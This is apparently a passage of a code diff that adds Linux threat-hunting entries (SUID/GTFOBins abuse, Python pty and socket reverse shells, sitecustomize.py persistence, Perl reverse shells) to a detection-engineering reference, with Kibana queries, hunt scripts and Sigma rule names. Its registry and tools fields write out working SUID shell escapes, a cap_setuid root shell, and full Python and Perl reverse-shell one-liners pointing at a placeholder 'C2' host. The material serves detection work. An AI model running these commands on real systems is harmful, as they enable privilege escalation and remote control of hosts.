+echo "[*] === Linux capabilities on interpreters ==="
+getcap -r / 2>/dev/null | \\
+  grep -E "(python|perl|ruby|node|lua|php|awk|vim|bash|dash)"
+
+echo ""
+echo "[*] === Sudoers: risky NOPASSWD entries ==="
+grep -r NOPASSWD /etc/sudoers /etc/sudoers.d/ 2>/dev/null | \\
+  grep -vE "^#" | \\
+  grep -E "(find|awk|vim|vi|less|more|env|tee|perl|python|ruby|node|bash|sh)"
+
+echo ""
+echo "[*] === auditd: SUID execve (auid != uid=0, today) ==="
+ausearch -k exec -i --start today 2>/dev/null | \\
+  awk '/SYSCALL/{line=$0} /uid=0/ && !/auid=0/ && !/auid=4294967295/{print line}'`,
+        registry: `SUID/capabilities attack surface:
+
+Find SUID binaries:
+  find / -perm -4000 -type f 2>/dev/null   (SUID)
+  find / -perm -2000 -type f 2>/dev/null   (SGID)
+
+High-risk GTFOBins when SUID is set:
+  /usr/bin/find      find . -exec /bin/sh -p \\; -quit
+  /usr/bin/awk       awk 'BEGIN {system("/bin/sh")}'
+  /usr/bin/vim       vim -c ':!/bin/sh'
+  /usr/bin/less      less → !/bin/sh
+  /usr/bin/env       env /bin/sh
+  /usr/bin/python3   python3 -p (drops to effective UID)
+  /usr/bin/perl      perl -e 'exec "/bin/sh";'
+  /usr/bin/tee       tee write to /etc/sudoers.d/
+
+Linux capabilities (stealthier than SUID):
+  getcap -r / 2>/dev/null
+  Dangerous: cap_setuid+ep, cap_dac_override+ep,
+    cap_sys_admin+ep, cap_net_raw+ep, cap_sys_ptrace+ep
+  
+  Attack: python3 with cap_setuid:
+    import os; os.setuid(0); os.system('/bin/bash')
+
+Sudoers misconfigurations:
+  /etc/sudoers
+  /etc/sudoers.d/
+  sudo -l                     - list current user's rules
+  Dangerous: (ALL) NOPASSWD: /usr/bin/find
+  
+Reference: gtfobins.github.io
+  Comprehensive catalog of Linux binary abuse paths`,
+        tools: `SUID/GTFOBins abuse in active intrusions:
+
+Post-ex enumeration tools:
+- LinPEAS: automated SUID, capabilities, sudo -l enum
+- LinEnum: enumerates all SUID binaries, sudo rules
+- Linux Exploit Suggester: flags SUID opportunities
+- PSPY: reveals SUID invocations in process monitoring
+- Metasploit: post/multi/recon/local_exploit_suggester
+
+Known intrusions:
+- Web shell → www-data → SUID perl/python on legacy
+  servers = instant root without any exploit needed
+- Rocke (CN): enumerates GTFOBins post-compromise
+  as privilege escalation step on cloud servers
+- CTF/red team: SUID find, sudo vim are the two most
+  frequently abused vectors in penetration tests
+
+Capabilities attack (more subtle):
+  python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
+  (requires cap_setuid+ep on the python3 binary)
+  Not visible in standard SUID check (find -perm -4000)
+  ONLY detectable via getcap
+
+Auditd signal for SUID execution:
+  In SYSCALL record: uid=<real> but euid=0
+  auid = original login UID (preserved even after SUID)
+  Discrepancy auid != euid=0 = SUID execution occurred`,
+        ossdetect: `Sigma rules:
+- proc_creation_lnx_susp_suid_execution.yml
+- proc_creation_lnx_gtfobins_sudo_abuse.yml
+- proc_creation_lnx_find_shell_exec.yml
+- proc_creation_lnx_awk_system_shell.yml
+
+Elastic detection rules:
+- SUID/SGID bit execution
+- Linux Privilege Escalation via SUID Binary
+- Potential GTFOBins Abuse
+
+osquery:
+  SELECT path, username, mode
+  FROM file JOIN users ON file.uid = users.uid
+  WHERE path LIKE '/usr/%' AND file.mode LIKE '4%';
+
+Velociraptor:
+  Linux.Sys.SUID (enumerate all SUID binaries)
+
+LinPEAS (attack surface discovery):
+  ./linpeas.sh | grep -A 3 "SUID"
+  Run on suspect host to enumerate exposure
+
+Atomic Red Team:
+  T1548.001 (SetUID/SetGID abuse tests)
+  Multiple tests for find, python, perl SUID exec
+
+Auditd:
+  ausearch -k exec -i | \\
+    awk '/SYSCALL/{uid=$0} /uid=0/ && !/auid=0/{print uid}'
+  Catches SUID executions where login UID != effective UID`,
+        notes: "SUID binaries and Linux capabilities are the primary sudo-less privilege escalation paths on Linux. The key insight is that SUID execution doesn't look like privilege escalation at the process-creation level - it is a normal binary invocation. The signal is in process metadata: effective UID (euid) differs from real UID (ruid), meaning the binary ran with elevated privileges. Auditd SYSCALL records capture both uid and auid (audit UID = the original login UID), so a comparison reveals SUID execution. The GTFOBins site catalogs every Unix binary that can turn SUID into a shell, and the list is longer than most defenders expect: find, awk, vim, less, more, env, tee, and many more. Linux capabilities are the subtler variant - instead of the full SUID bit, a binary gets specific kernel capabilities (cap_setuid, cap_dac_override) that grant targeted but still dangerous privileges. Critically, these do not appear in ls -la permissions output and require getcap to discover. A python3 binary with cap_setuid+ep is functionally equivalent to SUID root but invisible to the standard SUID hunt command.",
+        apt: [
+          { cls: "apt-cn", name: "Rocke / 8220 Gang", note: "Post-compromise SUID enumeration and GTFOBins abuse documented as privilege escalation step in cloud server campaigns." },
+          { cls: "apt-mul", name: "Web shell operators", note: "www-data context with SUID perl or python on legacy servers grants root without any exploit; common in web exploitation post-ex chains." },
+          { cls: "apt-mul", name: "Red team / pen test tooling", note: "LinPEAS, LinEnum, and Metasploit automate SUID and capabilities enumeration as standard first post-exploitation step." }
+        ],
+        cite: "MITRE ATT&CK T1059.004"
       }
     ]
   },
@@ -4402,6 +5208,424 @@ Falco:
           { cls: "apt-mul", name: "Red Team", note: "python -c reverse shells and pty.spawn upgrades are standard Linux post-ex tradecraft." },
         ],
         cite: "MITRE ATT&CK T1059.006",
+      },
+      {
+        sub: "T1059.006 - Python pty.spawn TTY Upgrade and Socket Reverse Shell",
+        os: "linux",
+        indicator: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")' — the near-universal dumb-shell-to-interactive upgrade used immediately after gaining a non-interactive reverse shell; or socket + os.dup2 + pty pattern for a full interactive socket-based shell",
+        sysmon: `// Sysmon for Linux EID 1 (ProcessCreate)
+// pty.spawn - very high confidence IOC
+
+EventID=1
+Image=(*python OR *python2 OR *python3)
+CommandLine matches:
+  *pty.spawn*                    (any pty.spawn call)
+  *pty.spawn('/bin/bash'*
+  *pty.spawn("/bin/bash"*
+  *pty.spawn('/bin/sh'*
+
+// Socket reverse shell anatomy
+CommandLine matches:
+  *socket(* AND *dup2(* AND (*exec* OR *bash* OR *sh*)
+  *os.dup2(s.fileno()* AND (*0* OR *1* OR *2*)
+  *socket.AF_INET* AND *socket.SOCK_STREAM*
+
+// Combined pty + socket (fully interactive shell over network)
+CommandLine matches:
+  *pty* AND *socket* AND (*dup2* OR *connect*)
+
+// EID 3 (NetworkConnect) from python process after pty.spawn
+// Correlate: EID 1 python with pty.spawn args → EID 3 outbound`,
+        kibana: `// pty.spawn - very high confidence, near-zero FP
+process.name: ("python" OR "python2" OR "python3")
+AND process.command_line: *pty.spawn*
+
+// Socket reverse shell components
+process.name: ("python" OR "python2" OR "python3")
+AND process.command_line: (*socket* AND *dup2* AND (*exec* OR *bash* OR *sh*))
+
+// Combined pty + socket (fully interactive)
+process.name: ("python" OR "python2" OR "python3")
+AND process.command_line: (*pty* AND *socket*)
+
+// Sysmon for Linux EID 1
+event.code: "1"
+AND process.executable: (*python*)
+AND process.command_line: (*pty.spawn* OR (*socket* AND *dup2*))
+
+// EID 3 - python network connection (post pty.spawn)
+event.code: "3"
+AND process.name: "python*"
+AND NOT destination.ip: ("127.0.0.1" OR "::1")
+AND NOT destination.port: (80 OR 443 OR 8080 OR 8443)`,
+        powershell: `#!/bin/bash
+# T1059.006 - pty.spawn and socket reverse shell hunt
+
+echo "[*] === auditd: pty.spawn invocations ==="
+ausearch -k exec -i 2>/dev/null | \\
+  grep -E "python[23]?" | grep "pty.spawn" | tail -30
+
+echo ""
+echo "[*] === auditd: python socket+dup2 reverse shells ==="
+ausearch -k exec -i 2>/dev/null | \\
+  grep -E "python[23]?" | \\
+  grep -E "(socket.*dup2|dup2.*socket|AF_INET.*SOCK_STREAM)" | tail -30
+
+echo ""
+echo "[*] === Live python processes with external network connections ==="
+for pid in $(pgrep -x python python3 python2 2>/dev/null | tr '\\n' ' '); do
+  cmd=$(tr '\\0' ' ' < /proc/$pid/cmdline 2>/dev/null)
+  conns=$(ss -tp 2>/dev/null | grep "pid=$pid,")
+  if [ -n "$conns" ]; then
+    echo "[FLAG] Python PID $pid has network socket:"
+    echo "  CMD: $cmd"
+    echo "  CONNS: $conns"
+  fi
+  if echo "$cmd" | grep -qE "(pty\\.spawn|socket.*dup2|AF_INET)"; then
+    echo "[FLAG] Suspicious python command line: $cmd"
+  fi
+done
+
+echo ""
+echo "[*] === Python processes spawned by shells or services ==="
+for pid in $(pgrep -x python python3 2>/dev/null); do
+  ppid=$(awk '/PPid/{print $2}' /proc/$pid/status 2>/dev/null)
+  parent=$(cat /proc/$ppid/comm 2>/dev/null)
+  cmd=$(tr '\\0' ' ' < /proc/$pid/cmdline 2>/dev/null)
+  if echo "$parent" | grep -qE "(bash|sh|dash|sshd|apache|nginx|php)"; then
+    echo "Parent: $parent (PID $ppid) → python PID $pid"
+    echo "  CMD: $cmd"
+  fi
+done
+
+echo ""
+echo "[*] === Dropped python payload files in writable paths ==="
+find /tmp /dev/shm /var/tmp /run -name "*.py" 2>/dev/null | head -20`,
+        registry: `Python reverse shell artifacts:
+
+No registry on Linux. Evidence locations:
+
+In-memory (no file on disk):
+  /proc/<pid>/cmdline   - live process command line
+  /proc/<pid>/environ   - attacker's environment vars
+  (both survive only while process is running)
+
+Network connections:
+  /proc/<pid>/net/tcp   - active IPv4 socket connections
+  /proc/<pid>/net/tcp6  - IPv6 connections
+  ss -tp                - show TCP connections with PID
+  lsof -i -p <pid>      - show all file descriptors
+
+PTY artifacts from pty.spawn:
+  /dev/pts/<n>          - pseudo-terminal allocated
+  who / w               - shows active pts sessions
+  last                  - historical pty logins
+
+Dropped script files:
+  /tmp/*.py , /dev/shm/*.py , /var/tmp/*.py
+
+Standard pty.spawn upgrade sequence:
+  1. python3 -c 'import pty;pty.spawn("/bin/bash")'
+  2. Ctrl+Z (background the shell)
+  3. stty raw -echo; fg
+  (attacker now has fully interactive shell with tab completion,
+   sudo prompts, vim support; indistinguishable from SSH session)
+
+Socket reverse shell one-liner (canonical):
+  python3 -c "import socket,os,pty;s=socket.socket();
+    s.connect(('C2',4444));
+    [os.dup2(s.fileno(),i) for i in range(3)];
+    pty.spawn('/bin/bash')" `,
+        tools: `pty.spawn is near-universal post-exploitation tradecraft:
+
+Why it matters:
+  Non-interactive shells (from curl|bash, webshells, cron)
+  cannot run sudo, vi, ssh, or respond to password prompts.
+  pty.spawn allocates a real pseudo-terminal, making the
+  shell fully interactive — this is the step that enables
+  all subsequent post-exploitation activities.
+
+Standard upgrade command:
+  python3 -c 'import pty;pty.spawn("/bin/bash")'
+  (documented in every post-exploitation guide)
+
+Socket reverse shell template (all-in-one):
+  python3 -c "
+    import socket,os,pty
+    s=socket.socket()
+    s.connect(('C2',4444))
+    [os.dup2(s.fileno(),i) for i in range(3)]
+    pty.spawn('/bin/bash')"
+
+Used by essentially every post-ex framework:
+- Metasploit python/meterpreter stages
+- Empire Linux agents
+- PentestMonkey reverse shell list (canonical reference)
+- RevShells.com generated shells
+- Custom implants from APT41, Lazarus, MuddyWater
+
+APT41 (CN) - documented use of python pty in Linux staging
+Lazarus (KP) - python socket shells in financial intrusions
+MuddyWater (IR) - python reverse shells on Linux targets
+
+Detection note:
+  pty.spawn has essentially zero legitimate -c use in
+  production environments. Any process.command_line
+  containing pty.spawn is almost certainly post-exploitation.`,
+        ossdetect: `Sigma rules:
+- proc_creation_lnx_python_pty_spawn.yml
+- proc_creation_lnx_python_reverse_shell.yml
+- net_connection_lnx_python_external.yml
+
+Elastic detection rules:
+- Python Reverse Shell via pty Module
+- Python Network Connection from Unusual Context
+
+Falco (high-confidence):
+  rule: Python Shell Spawned
+  condition: proc.name=python* and
+    proc.args contains pty.spawn
+  Very low false positive in production environments
+
+auditd + ausearch:
+  ausearch -k exec -i --start today | \\
+    grep python | grep pty.spawn
+
+execsnoop (BCC tools):
+  sudo execsnoop | grep -E "python.*pty"
+  Real-time tracing of all execve; catches the pty.spawn
+  the moment it runs
+
+Zeek / Suricata:
+  Correlate python process outbound connection with
+  subsequent interactive session behavior
+  (stdin-like packet pattern on non-HTTP port)
+
+Atomic Red Team:
+  T1059.006 tests include python reverse shell variants
+  that exercise pty.spawn patterns`,
+        notes: "pty.spawn('/bin/bash') is the single most common Python command used in active Linux intrusions. It is the universal step taken immediately after gaining a non-interactive shell (from curl|bash, a webshell, or a cron payload) to upgrade it to fully interactive. Nearly every operator runs this exact command within the first few interactions of a new shell. It is such a strong signal that alerting on any invocation of python with pty.spawn in the arguments has near-zero false positive rate in production environments - there is essentially no legitimate production use case for python -c with pty.spawn. The socket + os.dup2 pattern that accompanies it creates a complete network-backed interactive shell: the attacker connects a socket to their C2, then duplicates the socket file descriptor over stdin (fd 0), stdout (fd 1), and stderr (fd 2), so all shell I/O flows through the socket. The pty allocation makes the session indistinguishable from SSH at the pseudo-terminal level. Detection: auditd execve capture for pty.spawn in arguments, combined with EID 3 network connection from the python process to a non-internal IP, is definitive.",
+        apt: [
+          { cls: "apt-cn", name: "APT41", note: "Python pty.spawn documented in post-exploitation tool chains for interactive Linux server access." },
+          { cls: "apt-kp", name: "Lazarus", note: "Python socket reverse shells and pty upgrade documented in Linux financial intrusion tooling." },
+          { cls: "apt-ir", name: "MuddyWater", note: "Python socket reverse shells documented in campaigns against Linux and cross-platform targets." },
+          { cls: "apt-mul", name: "All interactive operators", note: "pty.spawn is documented post-exploitation tradecraft used across every interactive Linux intrusion; PentestMonkey reference shell is the most cited template." }
+        ],
+        cite: "MITRE ATT&CK T1059.006"
+      },
+      {
+        sub: "T1059.006 - Python Startup Hook Abuse (sitecustomize.py / PYTHONSTARTUP)",
+        os: "linux",
+        indicator: "Malicious code injected into sitecustomize.py or usercustomize.py in Python's site-packages — executes automatically on every Python invocation regardless of the calling script or user; or PYTHONSTARTUP env var pointing to an attacker-controlled file for per-session execution",
+        sysmon: `// Auditd rules — Python execution hook file monitoring
+
+// sitecustomize.py in all Python versions
+-a always,exit -F arch=b64 -S open,openat,creat,truncate \\
+  -F dir=/usr/lib/python3 -F perm=w -k python_site_write
+-a always,exit -F arch=b64 -S open,openat,creat,truncate \\
+  -F dir=/usr/local/lib -F perm=w -k python_site_write
+-a always,exit -F arch=b64 -S creat,open,openat \\
+  -F dir=/usr/lib/python3/dist-packages -F perm=w -k python_site_write
+
+// Specific file watches
+-w /usr/lib/python3/dist-packages/sitecustomize.py -p wa -k python_hook
+-w /usr/local/lib/python3.11/dist-packages/sitecustomize.py -p wa -k python_hook
+
+// .pth file drops (path injection in site-packages)
+// Sysmon for Linux EID 11: TargetFilename matches
+//   *site-packages/sitecustomize.py
+//   *dist-packages/sitecustomize.py
+//   *site-packages/usercustomize.py
+//   *site-packages/*.pth  (new .pth file)`,
+        kibana: `// sitecustomize.py or usercustomize.py modification
+event.module: "file_integrity"
+AND file.name: ("sitecustomize.py" OR "usercustomize.py")
+
+// Any write to Python site-packages paths
+event.module: "file_integrity"
+AND file.path: (
+  *dist-packages/sitecustomize.py OR
+  *site-packages/sitecustomize.py OR
+  *dist-packages/usercustomize.py OR
+  *site-packages/usercustomize.py
+)
+
+// Auditd key
+event.module: "auditd"
+AND tags: ("python_hook" OR "python_site_write")
+
+// New .pth file created in site-packages (path injection)
+event.module: "file_integrity"
+AND file.path: (*site-packages/*.pth OR *dist-packages/*.pth)
+AND event.type: "created"
+
+// Sysmon EID 11
+event.code: "11"
+AND winlog.event_data.TargetFilename: (*sitecustomize.py OR *usercustomize.py)
+
+// PYTHONSTARTUP env set to suspicious path in shell config
+event.module: "file_integrity"
+AND file.path: (/etc/profile.d/* OR */.bashrc OR */.bash_profile)
+AND event.type: "updated"
+// then grep content for PYTHONSTARTUP=`,
+        powershell: `#!/bin/bash
+# T1059.006 - Python startup hook hunt
+
+echo "[*] === sitecustomize.py files (all Python versions) ==="
+find / -name "sitecustomize.py" \\
+  -not -path "*/proc/*" -not -path "*/sys/*" 2>/dev/null | \\
+  while read f; do
+    echo "--- $f ---"
+    echo "  mtime:   $(stat -c '%y' "$f")"
+    echo "  size:    $(stat -c '%s' "$f") bytes"
+    echo "  package: $(dpkg -S "$f" 2>/dev/null || rpm -qf "$f" 2>/dev/null || echo 'NOT FROM PACKAGE')"
+    cat "$f"
+  done
+
+echo ""
+echo "[*] === usercustomize.py files ==="
+find / -name "usercustomize.py" \\
+  -not -path "*/proc/*" -not -path "*/sys/*" 2>/dev/null | \\
+  while read f; do
+    echo "--- $f ---"
+    cat "$f"
+  done
+
+echo ""
+echo "[*] === .pth files not from package manager ==="
+find /usr /usr/local -name "*.pth" 2>/dev/null | \\
+  while read f; do
+    pkg=$(dpkg -S "$f" 2>/dev/null || rpm -qf "$f" 2>/dev/null)
+    if [ -z "$pkg" ]; then
+      echo "[FLAG] Non-packaged .pth: $f"
+      cat "$f"
+    fi
+  done
+
+echo ""
+echo "[*] === PYTHONSTARTUP in running process environments ==="
+for pid in $(pgrep -x python python3 2>/dev/null); do
+  env_val=$(tr '\\0' '\\n' < /proc/$pid/environ 2>/dev/null | grep PYTHONSTARTUP)
+  if [ -n "$env_val" ]; then
+    echo "[FLAG] PID $pid: $env_val"
+    echo "  CMD: $(tr '\\0' ' ' < /proc/$pid/cmdline)"
+  fi
+done
+
+echo ""
+echo "[*] === PYTHONSTARTUP/PYTHONPATH in shell configs ==="
+grep -r "PYTHONSTARTUP\\|PYTHONPATH" \\
+  /etc/profile /etc/profile.d/ /etc/bash.bashrc \\
+  /root/.bashrc /root/.bash_profile \\
+  /home/*/.bashrc /home/*/.bash_profile 2>/dev/null | grep -v "^#"
+
+echo ""
+echo "[*] === Recently modified Python site-packages (.py files) ==="
+find /usr/lib/python3 /usr/local/lib/python3* \\
+  -name "*.py" -mtime -7 -not -path "*/__pycache__/*" -ls 2>/dev/null | \\
+  head -20`,
+        registry: `Python startup hook locations:
+
+sitecustomize.py (system-level — runs for ALL Python):
+  /usr/lib/python3/dist-packages/sitecustomize.py
+  /usr/lib/python3.<ver>/sitecustomize.py
+  /usr/local/lib/python3.<ver>/site-packages/sitecustomize.py
+  Executed automatically on EVERY Python interpreter start,
+  regardless of calling user or script
+
+usercustomize.py (user-level — no root needed):
+  ~/.local/lib/python3.<ver>/site-packages/usercustomize.py
+  Runs for current user's Python sessions only
+
+.pth files (path injection):
+  /usr/local/lib/python3.<ver>/dist-packages/*.pth
+  Each line adds a directory to sys.path
+  Allows loading of attacker-controlled modules
+
+PYTHONSTARTUP environment variable:
+  Set in ~/.bashrc, /etc/profile.d/*.sh
+  Points to .py file executed on interactive Python sessions
+  Example: export PYTHONSTARTUP=/tmp/.pyinit.py
+
+PYTHONPATH hijacking:
+  export PYTHONPATH=/tmp/malmodules:$PYTHONPATH
+  Prepends attacker dir to module search path
+  Malicious 'os.py' or 'requests.py' loads before stdlib
+
+High-impact scenario:
+  Root cron job runs python3 → sitecustomize.py backdoor
+  runs with root privilege on every cron invocation
+  (technique combines T1053.003 + T1059.006)`,
+        tools: `Python hook persistence documented in:
+
+Elastic Security Labs:
+  'Approaching the Summit on Persistence Mechanisms'
+  (February 2025) — sitecustomize.py and usercustomize.py
+  documented with detection hunting rules
+
+PANIX (persistence simulation):
+  ./panix.sh --python (tests sitecustomize.py injection)
+  github.com/Aegrah/PANIX
+
+Pepe Berba blog series:
+  'Hunting for Persistence in Linux'
+  sitecustomize.py and .pth file abuse documented
+
+APT/operator use cases:
+  Useful when attacker wants code to run in context of
+  every Python script on host — monitoring scripts,
+  cron jobs, admin tools
+  sitecustomize.py runs as whatever user invokes Python,
+  making it privilege-aware persistence
+
+PYTHONPATH hijacking (module shadowing):
+  Attacker drops malicious requests.py or json.py in
+  /tmp/malmodules/ then sets PYTHONPATH
+  Every Python script that imports those names loads
+  attacker code instead of stdlib
+
+Detection via integrity:
+  sitecustomize.py changes only during package installs
+  (dpkg/pip). Any change outside a package install
+  window = critical indicator`,
+        ossdetect: `Sigma rules:
+- file_event_lnx_python_sitecustomize_modification.yml
+- file_event_lnx_python_pth_file_creation.yml
+- proc_creation_lnx_python_startup_env.yml
+
+Elastic Security Labs:
+  'Approaching the Summit on Persistence' (2025)
+  Python hook detection hunting rule included
+
+PANIX:
+  ./panix.sh --python
+  Tests sitecustomize.py injection and PYTHONSTARTUP
+  github.com/Aegrah/PANIX
+
+AIDE / Tripwire:
+  Add Python site-packages directories to integrity db:
+  /usr/lib/python3 p+sha256+i+n+u+g
+  /usr/local/lib/python3 p+sha256+i+n+u+g
+  Any sitecustomize.py change = immediate alert
+
+Package verify:
+  dpkg --verify python3 python3-minimal (Debian)
+  rpm -V python3 (RHEL)
+  Flag on sitecustomize.py = critical investigate
+
+auditd:
+  ausearch -k python_site_write --start today
+  ausearch -k python_hook --start today
+
+Velociraptor:
+  Linux.Detection.Artifacts (includes Python hook paths)
+  Custom VQL: glob /usr/lib/python3/**/*customize*.py`,
+        notes: "sitecustomize.py is a legitimate Python mechanism that executes automatically at every interpreter startup - it is designed for system administrators to customize the Python environment system-wide. An attacker with write access to this file gets code execution on every Python invocation on the host, regardless of which script is called or which user runs it. This is particularly dangerous in environments where Python is used in cron jobs, monitoring scripts, or system automation: backdoor code in sitecustomize.py runs with whatever privilege those scripts carry. The usercustomize.py variant is lower-privilege (no root needed, only affects current user) but easier to plant. The PYTHONSTARTUP variant is more limited - it fires only for interactive Python sessions, not scripted invocations - making it most useful for credential harvesting when administrators use the Python REPL. The .pth file technique is the most subtle: a .pth file with an import statement (supported in Python 2, via directory-based loading in Python 3) or an absolute path pointing to an attacker-controlled directory allows arbitrary module shadowing. Detection priority: file integrity monitoring on all Python site-packages directories, combined with package manager verification after any change - these directories should only change during dpkg/pip package installations.",
+        apt: [
+          { cls: "apt-mul", name: "Advanced operators", note: "sitecustomize.py persistence documented in Elastic Security Labs Linux persistence research 2024-2025; used for covert execution via system Python invocations." },
+          { cls: "apt-mul", name: "Red team tooling", note: "PANIX tests sitecustomize.py injection; technique documented in multiple Linux persistence hunting guides." }
+        ],
+        cite: "MITRE ATT&CK T1059.006"
       }
     ]
   },
@@ -4531,6 +5755,423 @@ Velociraptor:
           { cls: "apt-mul", name: "Rocke / 8220 Gang", note: "Cron-based re-infection loops are signature behavior for Linux coinminer crews." },
         ],
         cite: "MITRE ATT&CK T1053.003",
+      }
+    ]
+  }
+,
+  {
+    id: "T1059",
+    name: "Command and Scripting Interpreter: Perl / Legacy Interpreters",
+    desc: "Perl one-liner reverse shells (-e with Socket/exec), CGI-era webshell execution, and interpreter execution from /tmp or web-accessible paths — primarily relevant on legacy Linux servers and OT-adjacent infrastructure where perl is available",
+    rows: [
+      {
+        sub: "T1059 - Perl Reverse Shell and One-Liner Execution",
+        os: "linux",
+        indicator: "perl invoked with -e inline code containing socket/exec patterns, or executing a script from /tmp or /dev/shm — perl reverse shells are common on legacy Linux servers and in CGI exploitation chains where perl is present",
+        sysmon: `// Sysmon for Linux EID 1 (ProcessCreate)
+EventID=1
+Image=(*perl OR */usr/bin/perl)
+CommandLine matches:
+  *-e* AND (*socket* OR *exec */bin/sh* OR *exec "/bin/bash"*)
+  *-e* AND (*STDIN* OR *STDOUT* OR *STDERR*)   (fd dup pattern)
+  *-e* AND (*fork* OR *connect*)
+  *-e* AND (*use Socket* OR *use POSIX*)
+
+// Perl executing a script from writable/temp path
+CommandLine matches:
+  */tmp/*.pl  OR  */dev/shm/*.pl  OR  */var/tmp/*.pl
+
+// Perl spawned by web server (webshell/CGI execution)
+// Same parent check as T1059.004 web-spawn:
+ParentImage matches (*httpd* OR *nginx* OR *php* OR *apache*)
+AND Image matches *perl
+
+// Sysmon for Linux EID 3 (NetworkConnect) from perl
+// perl process establishing outbound connection`,
+        kibana: `// Perl inline execution with socket/shell patterns
+process.name: "perl"
+AND process.command_line: (*-e* AND (*socket* OR *exec* AND (*bash* OR */bin/sh*)))
+
+// Perl running script from suspicious path
+process.name: "perl"
+AND process.command_line: (*/tmp/* OR */dev/shm/* OR */var/tmp/*)
+AND process.command_line: *.pl*
+
+// Perl spawned by web process (CGI / webshell)
+process.name: "perl"
+AND process.parent.name: (
+  "httpd" OR "apache2" OR "nginx" OR "lighttpd" OR "php-fpm"
+)
+
+// Network connection from perl process
+event.code: "3"
+AND process.name: "perl"
+AND NOT destination.ip: ("127.0.0.1" OR "::1")
+
+// Sysmon EID 1 - perl with shell exec
+event.code: "1"
+AND process.executable: *perl
+AND process.command_line: (*-e* AND (*socket* OR *exec*))`,
+        powershell: `#!/bin/bash
+# T1059 Perl - reverse shell and execution hunt
+
+echo "[*] === auditd: perl with -e socket/exec patterns ==="
+ausearch -k exec -i 2>/dev/null | \\
+  grep perl | grep -E "(-e.*socket|-e.*exec.*sh|-e.*fork)" | tail -30
+
+echo ""
+echo "[*] === Live perl processes ==="
+ps -eo pid,ppid,user,comm,args 2>/dev/null | grep perl | grep -v "grep"
+
+echo ""
+echo "[*] === perl processes with network connections ==="
+for pid in $(pgrep -x perl 2>/dev/null); do
+  conns=$(ss -tp 2>/dev/null | grep "pid=$pid,")
+  if [ -n "$conns" ]; then
+    echo "[FLAG] perl PID $pid has network connection:"
+    echo "  CMD: $(tr '\\0' ' ' < /proc/$pid/cmdline)"
+    echo "  CONN: $conns"
+  fi
+done
+
+echo ""
+echo "[*] === perl scripts in suspicious paths ==="
+find /tmp /dev/shm /var/tmp -name "*.pl" 2>/dev/null | \\
+  while read f; do
+    echo "[FLAG] $f"
+    head -5 "$f"
+  done
+
+echo ""
+echo "[*] === Web CGI perl scripts (non-package) ==="
+find /usr/lib/cgi-bin /var/www/cgi-bin -name "*.pl" 2>/dev/null | \\
+  while read f; do
+    pkg=$(dpkg -S "$f" 2>/dev/null || rpm -qf "$f" 2>/dev/null)
+    [ -z "$pkg" ] && echo "[FLAG] Non-packaged CGI perl: $f"
+  done`,
+        registry: `Perl execution artifacts:
+
+Perl binary locations:
+  /usr/bin/perl
+  /usr/local/bin/perl (custom install)
+
+Script locations to watch:
+  /tmp/*.pl , /dev/shm/*.pl , /var/tmp/*.pl
+  /usr/lib/cgi-bin/*.pl        - CGI scripts
+  /var/www/cgi-bin/*.pl        - web CGI
+  /var/www/html/**/*.pl        - web-accessible perl
+
+History artifacts:
+  ~/.bash_history              - perl -e invocations logged
+  /var/log/apache2/access.log  - CGI perl calls via HTTP
+
+Canonical Perl reverse shell (PentestMonkey):
+  perl -e 'use Socket;$i="C2";$p=4444;
+    socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
+    connect(S,sockaddr_in($p,inet_aton($i)));
+    open(STDIN,">&S"); open(STDOUT,">&S");
+    open(STDERR,">&S"); exec("/bin/sh -i");'
+
+Perl SUID execution:
+  perl -e 'exec "/bin/sh";' (if perl has SUID bit)
+  perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
+
+Legacy webshell pattern:
+  CGI-era: HTTP POST to /cgi-bin/victim.pl → shell spawn
+  Still found on legacy Apache/RHEL6 systems`,
+        tools: `Perl in attack tooling and APT campaigns:
+
+Historical prevalence:
+  Perl was the dominant scripting language for Linux
+  webshells and backdoors from ~2000 to ~2015.
+  Many legacy Linux servers still have perl installed
+  and many legacy exploits use perl payloads.
+
+Active use today:
+  - CGI exploitation chains on legacy Apache/RHEL systems
+  - Post-exploitation when python is absent but perl exists
+  - Some older APT toolkits include perl components
+
+Perl webshell families:
+  r57shell, c99shell (PHP but often paired with perl CGI)
+  Older Linux webshells frequently written in Perl
+  Still encountered on RHEL6/CentOS6 systems in OT/legacy env
+
+PentestMonkey reverse shells:
+  pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+  Perl reverse shell is one of the primary documented variants
+
+Known APT perl use:
+  Various Iran-nexus actors have used perl post-exploitation
+  scripts on compromised Linux infrastructure
+  Older Lazarus tooling included perl components
+  Legacy Linux worms (Slapper, Adore) written in perl
+
+Detection note:
+  perl -e with socket and exec is effectively the same
+  signal quality as python -c with socket and pty.spawn.
+  Alert threshold should be identical.`,
+        ossdetect: `Sigma rules:
+- proc_creation_lnx_perl_reverse_shell.yml
+- proc_creation_lnx_perl_susp_execution.yml
+- proc_creation_lnx_webserver_spawn_perl.yml
+
+Elastic:
+- Perl Reverse Shell Execution
+- Web Server Spawning Perl Process
+
+Atomic Red Team:
+  T1059 parent tests include Perl one-liner variants
+
+auditd + ausearch:
+  ausearch -k exec -i | grep perl | \\
+    grep -E "socket|exec.*sh|fork"
+
+Falco:
+  rule: Perl Shell Spawned by Web Process
+  (adapt the existing web_server_binaries rule for perl)
+
+Note: Perl detection is lower-coverage in OSS rules than
+python because it is less prevalent in modern environments.
+Custom Sigma rules are recommended for environments with
+legacy perl-heavy infrastructure.`,
+        notes: "Perl reverse shells are a legacy technique that remains relevant on any Linux server where Perl is installed (which is most RHEL 6/7 and many Ubuntu systems). While Python has largely displaced Perl in modern attack tooling, Perl payloads are still encountered in exploitation of legacy CGI-era web applications, older OT-adjacent Linux systems, and situations where Python is absent but Perl is available. The canonical PentestMonkey Perl reverse shell is well-known and should be treated as a high-confidence alert: use Socket, fork, and exec /bin/sh in the same perl -e invocation with an outbound network connection is near-certain exploitation. For environments with legacy RHEL 6 or CentOS 6 systems - particularly common in OT/ICS adjacent networks - Perl webshell detection deserves priority attention because those systems often run Apache with CGI enabled and have perl in /usr/bin.",
+        apt: [
+          { cls: "apt-ir", name: "Iran-nexus actors", note: "Perl post-exploitation scripts documented on compromised Linux infrastructure in multiple campaigns." },
+          { cls: "apt-kp", name: "Lazarus", note: "Older Lazarus tooling included Perl components; encountered on legacy Linux server targets." },
